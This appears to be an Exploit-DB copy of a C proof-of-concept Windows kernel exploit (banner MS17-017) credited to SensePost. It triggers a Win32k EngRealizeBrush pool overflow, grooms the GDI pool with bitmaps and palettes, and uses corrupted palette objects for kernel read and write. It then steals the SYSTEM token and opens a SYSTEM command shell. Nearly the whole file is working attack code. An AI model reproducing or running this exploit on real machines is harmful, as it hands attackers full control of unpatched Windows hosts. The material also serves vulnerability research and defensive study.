# E-DB Note: 
# + Source: https://github.com/sensepost/gdi-palettes-exp
# + Binary: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/42432.exe

#include <Windows.h>
#include <stdio.h>
#include <winddi.h>
#include <Psapi.h>

//From http://stackoverflow.com/a/26414236 this defines the details of the NtAllocateVirtualMemory function
//which we will use to map the NULL page in user space.
typedef NTSTATUS(WINAPI *PNtAllocateVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID *BaseAddress,
	ULONG ZeroBits,
	PULONG AllocationSize,
	ULONG AllocationType,
	ULONG Protect
	);

static HBITMAP bitmaps[2000];
static HPALETTE hp[2000];
HANDLE hpWorker, hpManager, hManager;
BYTE *bits;


// https://www.coresecurity.com/blog/abusing-gdi-for-ring0-exploit-primitives
//dt nt!_EPROCESS UniqueProcessID ActiveProcessLinks Token
typedef struct
{
	DWORD UniqueProcessIdOffset;
	DWORD TokenOffset;
} VersionSpecificConfig;

//VersionSpecificConfig gConfig = { 0x0b4 , 0x0f8  }; //win 7 SP 1
VersionSpecificConfig gConfig = { 0x0b4 , 0x0f8 };
void SetAddress(UINT* address) {
	SetPaletteEntries((HPALETTE)hpManager, 0x3FE, 1, (PALETTEENTRY*)address);
}

void WriteToAddress(UINT* data, DWORD len) {
	SetPaletteEntries((HPALETTE)hpWorker, 0, len, (PALETTEENTRY*)data);
}

UINT ReadFromAddress(UINT src, UINT* dst, DWORD len) {
	SetAddress((UINT *)&src);
	DWORD res = GetPaletteEntries((HPALETTE)hpWorker, 0, len, (LPPALETTEENTRY)dst);
	return res;
}

// Get base of ntoskrnl.exe
UINT GetNTOsBase()
{
	UINT Bases[0x1000];
	DWORD needed = 0;
	UINT krnlbase = 0;
	if (EnumDeviceDrivers((LPVOID *)&Bases, sizeof(Bases), &needed)) {
		krnlbase = Bases[0];
	}
	return krnlbase;
}

// Get EPROCESS for System process
UINT PsInitialSystemProcess()
{
	// load ntoskrnl.exe

	UINT ntos = (UINT)LoadLibrary("ntkrnlpa.exe");
	// get address of exported PsInitialSystemProcess variable
	UINT addr = (UINT)GetProcAddress((HMODULE)ntos, "PsInitialSystemProcess");
	FreeLibrary((HMODULE)ntos);
	UINT res = 0;
	UINT ntOsBase = GetNTOsBase();
	// subtract addr from ntos to get PsInitialSystemProcess offset from base
	if (ntOsBase) {
		ReadFromAddress(addr - ntos + ntOsBase, (UINT *)&res, sizeof(UINT) / sizeof(PALETTEENTRY));//0x169114
	}
	return res;
}

// Get EPROCESS for current process
UINT PsGetCurrentProcess()
{
	UINT pEPROCESS = PsInitialSystemProcess();// get System EPROCESS

											  // walk ActiveProcessLinks until we find our Pid
	LIST_ENTRY ActiveProcessLinks;
	ReadFromAddress(pEPROCESS + gConfig.UniqueProcessIdOffset + sizeof(UINT), (UINT *)&ActiveProcessLinks, sizeof(LIST_ENTRY) / sizeof(PALETTEENTRY));

	UINT res = 0;

	while (TRUE) {
		UINT UniqueProcessId = 0;

		// adjust EPROCESS pointer for next entry
		pEPROCESS = (UINT)(ActiveProcessLinks.Flink) - gConfig.UniqueProcessIdOffset - sizeof(UINT);
		// get pid
		ReadFromAddress(pEPROCESS + gConfig.UniqueProcessIdOffset, (UINT *)&UniqueProcessId, sizeof(UINT) / sizeof(PALETTEENTRY));
		// is this our pid?
		if (GetCurrentProcessId() == UniqueProcessId) {
			res = pEPROCESS;
			break;
		}
		// get next entry
		ReadFromAddress(pEPROCESS + gConfig.UniqueProcessIdOffset + sizeof(UINT), (UINT *)&ActiveProcessLinks, sizeof(LIST_ENTRY) / sizeof(PALETTEENTRY));
		// if next same as last, we reached the end
		if (pEPROCESS == (UINT)(ActiveProcessLinks.Flink) - gConfig.UniqueProcessIdOffset - sizeof(UINT))
			break;
	}
	return res;
}


void fengshui() {
	HBITMAP bmp;
	// we need 2 object 0x7F4
	for (int y = 0; y < 2000; y++) {
		//0x3A3 = 0xFe8
		bmp = CreateBitmap(0x3A3, 1, 1, 32, NULL);
		bitmaps[y] = bmp;
	}

	//Spray LpszMenuName User object in GDI pool. Ustx
	// size 0x10+8
	TCHAR st[0x32];
	for (int s = 0; s < 2000; s++) {
		WNDCLASSEX Class2 = { 0 };
		wsprintf(st, "Class%d", s);
		Class2.lpfnWndProc = DefWindowProc;
		Class2.lpszClassName = st;
		Class2.lpszMenuName = "Saif";
		Class2.cbSize = sizeof(WNDCLASSEX);
		if (!RegisterClassEx(&Class2)) {
			printf("bad %d %d\r\n", s, GetLastError());
			break;
		}
	}

	for (int s = 0; s < 2000; s++) {
		DeleteObject(bitmaps[s]);
	}


	for (int k = 0; k < 2000; k++) {
		//0x1A6 = 0x7f0+8
		bmp = CreateBitmap(0x1A6, 1, 1, 32, NULL);
		bitmaps[k] = bmp;
	}


	HPALETTE hps;
	LOGPALETTE *lPalette;
	//0x1E3  = 0x7e8+8
	lPalette = (LOGPALETTE*)malloc(sizeof(LOGPALETTE) + (0x1E3 - 1) * sizeof(PALETTEENTRY));
	lPalette->palNumEntries = 0x1E3;
	lPalette->palVersion = 0x0300;
	// for allocations bigger than 0x98 its Gh08 for less its always 0x98 and the tag is Gla18
	for (int k = 0; k < 2000; k++) {
		hps = CreatePalette(lPalette);
		if (!hps) {
			printf("%s - %d - %d\r\n", "CreatePalette - Failed", GetLastError(), k);
			//return;
		}
		hp[k] = hps;
	}

	TCHAR fst[0x32];
	for (int f = 500; f < 750; f++) {
		wsprintf(fst, "Class%d", f);
		UnregisterClass(fst, NULL);
	}

}

UINT GetAddress(BYTE *buf, UINT offset) {
	BYTE bytes[4];
	for (int i = 0; i < 4; i++) {
		bytes[i] = buf[offset + i];
	}
	UINT addr = *(UINT *)bytes;
	return addr;
}

int main(int argc, char *argv[]) {
	HWND hwnd;
	WNDCLASSEX Class = { 0 };
	Class.lpfnWndProc = DefWindowProc;
	Class.lpszClassName = "Class";
	Class.cbSize = sizeof(WNDCLASSEX);

	printf("    __  ________________      ____ ________\r\n");
	printf("   /  |/  / ___<  /__  /     / __ <  /__  /\r\n");
	printf("  / /|_/ /\__ \/ /  / /_____/ / / / /  / / \r\n");
	printf(" / /  / /___/ / /  / /_____/ /_/ / /  / /  \r\n");
	printf("/_/  /_//____/_/  /_/      \____/_/  /_/   \r\n");
	printf("\r\n");
	printf("      [*] By Saif (at) SensePost \r\n");
	printf("	  Twitter: Saif_Sherei\r\n");
	printf("\r\n");
	printf("\r\n");

	if (!RegisterClassEx(&Class)) {
		printf("%s\r\n", "RegisterClass - Failed");
		return 1;
	}
	hwnd = CreateWindowEx(NULL, "Class", "Test1", WS_VISIBLE, 0x5a1f, 0x5a1f, 0x5a1f, 0x5a1f, NULL, NULL, 0, NULL);
	HDC hdc = GetDC(hwnd);

	//0x10 is the magic number
	printf("[*] Creating Pattern Brush Bitmap.\r\n");
	HBITMAP bitmap = CreateBitmap(0x23, 0x1d41d41, 1, 1, NULL);
	//HBITMAP bitmap = CreateBitmap(0x5aa, 0x11f, 1, 1, NULL);
	if (!bitmap) {
		printf("%s - %d\r\n", "CreateBitmap Failed.\r\n", GetLastError());
		return 1;
	}

	//https://github.com/sam-b/HackSysDriverExploits/blob/master/HackSysNullPointerExploit/HackSysNullPointerExploit/HackSysNullPointerExploit.cpp
	HMODULE hNtdll = GetModuleHandle("ntdll.dll");
	//Get address of NtAllocateVirtualMemory from the dynamically linked library and then cast it to a callable function type
	FARPROC tmp = GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	PNtAllocateVirtualMemory NtAllocateVirtualMemory = (PNtAllocateVirtualMemory)tmp;
	//We can't outright pass NULL as the address but if we pass 1 then it gets rounded down to 0...
	//PVOID baseAddress = (PVOID)0x1;
	PVOID baseAddress = (PVOID)0x1;
	SIZE_T regionSize = 0xFF; //Probably enough, it will get rounded up to the next page size
							  // Map the null page
	NTSTATUS ntStatus = NtAllocateVirtualMemory(
		GetCurrentProcess(), //Current process handle
		&baseAddress, //address we want our memory to start at, will get rounded down to the nearest page boundary
		0, //The number of high-order address bits that must be zero in the base address of the section view. Not a clue here
		&regionSize, //Required size - will be modified to actual size allocated, is rounded up to the next page boundary
		MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN, //claim memory straight away, get highest appropriate address
		PAGE_EXECUTE_READWRITE //All permissions
	);

	if (ntStatus != 0) {
		printf("Virtual Memory Allocation Failed: 0x%x\n", ntStatus);
		FreeLibrary(hNtdll);
		return 1;
	}

	PVOID nullPointer = (PVOID)((UINT)0x4);
	*(PUINT)nullPointer = (UINT)1;

	// 
	printf("[*] Creating Pattern Brush.\r\n");
	HBRUSH hbrBkgnd = CreatePatternBrush(bitmap);

	SelectObject(hdc, hbrBkgnd);
	fengshui();
	printf("[*] Triggering Overflow in Win32k!EngRealizeBrush.\r\n");
	//__debugbreak();
	PatBlt(hdc, 0x100, 0x10, 0x100, 0x100, PATCOPY);
	HRESULT res;
	bits = (BYTE*)malloc(0x6F8);
	for (int i = 0; i < 2000; i++) {
		res = GetBitmapBits(bitmaps[i], 0x6F8, bits);
		if (res > 0x6F8 - 1) {
			
			hManager = bitmaps[i];
			printf("[*] Manager Bitmap: %d\r\n", i);
			break;
		}
	}
	//__debugbreak();

	//Get pFirstColor of adjacent Gh?8 XEPALOBJ Palette object
	UINT pFirstColor = GetAddress(bits, 0x6F8 - 8);
	printf("[*] Original Current Manager XEPALOBJ->pFirstColor: 0x%x\r\n", pFirstColor);

	UINT cEntries = GetAddress(bits, 0x6F8 - 8 - 0x38);
	printf("[*] Original Manager XEPALOBJ->cEntries: 0x%x\r\n", cEntries);

	//BYTE *bytes = (BYTE*)&cEntries;
	for (int y = 0; y < 4; y++) {
		bits[0x6F8 - 8 - 0x38 + y] = 0xFF;
	}
	//__debugbreak();
	SetBitmapBits((HBITMAP)hManager, 0x6F8, bits);
	//__debugbreak();

	res = GetBitmapBits((HBITMAP)hManager, 0x6F8, bits);
	UINT uEntries = GetAddress(bits, 0x6F8 - 8 - 0x38);
	printf("[*] Updated Manager XEPALOBJ->cEntries: 0x%x\r\n", uEntries);

	UINT *rPalette;
	rPalette = (UINT*)malloc((0x400 - 1) * sizeof(PALETTEENTRY));
	memset(rPalette, 0x0, (0x400 - 1) * sizeof(PALETTEENTRY));
	for (int k = 0; k < 2000; k++) {
		UINT res = GetPaletteEntries(hp[k], 0, 0x400, (LPPALETTEENTRY)rPalette);
		if (res > 0x3BB) {
			printf("[*] Manager XEPALOBJ Object Handle: 0x%x\r\n", hp[k]);
			hpManager = hp[k];
			break;
		}
	}
	//__debugbreak();
	//for (int y = 0x3F0; y < 0x400; y++) {
	//	printf("%04x ", rPalette[y]);
	//}
	//printf("\r\n");

	UINT wAddress = rPalette[0x3FE];
	printf("[*] Worker XEPALOBJ->pFirstColor: 0x%04x.\r\n", wAddress);

	UINT tHeader = pFirstColor - 0x1000;
	tHeader = tHeader & 0xFFFFF000;
	printf("[*] Gh05 Address: 0x%04x.\r\n", tHeader);
	//__debugbreak();
	SetAddress(&tHeader);
	
	//SetPaletteEntries((HPALETTE)hpManager, 0x3FE, 1, (PALETTEENTRY*)&tHeader);

	UINT upAddress;
	GetPaletteEntries((HPALETTE)hpManager, 0x3FE, 1, (LPPALETTEENTRY)&upAddress);
	printf("[*] Updated Worker XEPALOBJ->pFirstColor: 0x%04x.\r\n", upAddress);

	UINT wBuffer[2];
	for (int x = 0; x < 2000; x++) {
		GetPaletteEntries((HPALETTE)hp[x], 0, 2, (LPPALETTEENTRY)wBuffer);
		//Debug
		//if (wBuffer != 0xcdcdcdcd) {
		// Release
		//if (wBuffer[1] == 0x35316847) {
		if (wBuffer[1] >> 24 == 0x35) {
			hpWorker = hp[x];
			printf("[*] Worker XEPALOBJ object Handle: 0x%x\r\n", hpWorker);
			printf("[*] wBuffer: %x\r\n", wBuffer[1]);
			break;
		}
	}
	
	UINT gHeader[8];
	//gHeader = (UINT*)malloc((0x4 - 1) * sizeof(PALETTEENTRY));
	//GetPaletteEntries((HPALETTE)hpWorker, 0, 4, (LPPALETTEENTRY)gHeader);
	ReadFromAddress(tHeader, gHeader, 8);
	//__debugbreak();
	UINT oHeader = pFirstColor & 0xFFFFF000;
	printf("[*] Overflowed Gh05 Address: 0x%04x.\r\n", oHeader);
	UINT oValue = oHeader + 0x1C;
	//SetPaletteEntries((HPALETTE)hpManager, 0x3FE, 1, (PALETTEENTRY*)&oValue);
	UINT value;
	//GetPaletteEntries((HPALETTE)hpWorker, 0, 1, (LPPALETTEENTRY)&value);
	//printf("[*] Value: 0x%04x.\r\n", value);
	ReadFromAddress(oValue, &value, 1);

	//printf("[*] Gh05 Object Header:\r\n");
	//printf("    %04x %04x %04x %04x\r\n", gHeader[0], gHeader[1], gHeader[2], gHeader[3]);
	//printf("    %04x %04x %04x %04x\r\n", gHeader[4], gHeader[5], gHeader[6], gHeader[7]);
	//SetPaletteEntries((HPALETTE)hpManager, 0x3FE, 1, (PALETTEENTRY*)&oHeader);
	gHeader[2] = value;
	gHeader[3] = 0;
	gHeader[7] = value;
	//SetPaletteEntries((HPALETTE)hpWorker, 0, 4, (PALETTEENTRY*)gHeader);
	UINT oHeaderdata[8];
	
	ReadFromAddress(oHeader, oHeaderdata, 8);
	printf("[*] Gh05 Overflowed Object Header:\r\n");
	printf("    %04x %04x %04x %04x\r\n", oHeaderdata[0], oHeaderdata[1], oHeaderdata[2], oHeaderdata[3]);
	printf("    %04x %04x %04x %04x\r\n", oHeaderdata[4], oHeaderdata[5], oHeaderdata[6], oHeaderdata[7]);

	printf("[*] Gh05 Fixed Object Header:\r\n");
	printf("    %04x %04x %04x %04x\r\n", gHeader[0], gHeader[1], gHeader[2], gHeader[3]);
	printf("    %04x %04x %04x %04x\r\n", gHeader[4], gHeader[5], gHeader[6], gHeader[7]);
	
	SetAddress(&oHeader);
	//__debugbreak();
	WriteToAddress(gHeader, 8);
	printf("[*] Fixed Overflowed Gh05 Object Header.\r\n");
	//UINT uHeader[8];
	//ReadFromAddress(oHeader, uHeader, 8);
	//printf("[*] Gh05 Overflowed Fixed Object Header:\r\n");
	//printf("    %04x %04x %04x %04x\r\n", uHeader[0], uHeader[1], uHeader[2], uHeader[3]);
	//printf("    %04x %04x %04x %04x\r\n", uHeader[4], uHeader[5], uHeader[6], uHeader[7]);

	// get System EPROCESS
	UINT SystemEPROCESS = PsInitialSystemProcess();
	//__debugbreak();
	//fprintf(stdout, "\r\n%x\r\n", SystemEPROCESS);
	UINT CurrentEPROCESS = PsGetCurrentProcess();
	//__debugbreak();
	//fprintf(stdout, "\r\n%x\r\n", CurrentEPROCESS);
	UINT SystemToken = 0;
	// read token from system process
	ReadFromAddress(SystemEPROCESS + gConfig.TokenOffset, &SystemToken, 1);
	fprintf(stdout, "[*] Got System Token: %x\r\n", SystemToken);
	// write token to current process
	UINT CurProccessAddr = CurrentEPROCESS + gConfig.TokenOffset;
	SetAddress(&CurProccessAddr);

	WriteToAddress(&SystemToken, 1);
	//__debugbreak();
	printf("[*] Dropping in SYSTEM shell...\r\n\r\n");
	// Done and done. We're System :)
	system("cmd.exe");


	//getchar();
	for (int f = 0; f < 2000; f++) {
		DeleteObject(bitmaps[f]);
	}
	for (int f = 0; f < 2000; f++) {
		DeleteObject(hp[f]);
	}
	TCHAR fst[0x32];
	for (int f = 0; f < 500; f++) {
		wsprintf(fst, "Class%d", f);
		UnregisterClass(fst, NULL);
	}

	for (int f = 751; f < 2000; f++) {
		wsprintf(fst, "Class%d", f);
		UnregisterClass(fst, NULL);
	}

	ReleaseDC(hwnd, hdc);
	DeleteDC(hdc);
	DeleteObject(hbrBkgnd);
	DeleteObject(bitmap);
	FreeLibrary(hNtdll);
	//free(bitmaps);
	//VirtualFree(&baseAddress, regionSize, MEM_RELEASE);
	//DestroyWindow(hwnd);
	return 0;
}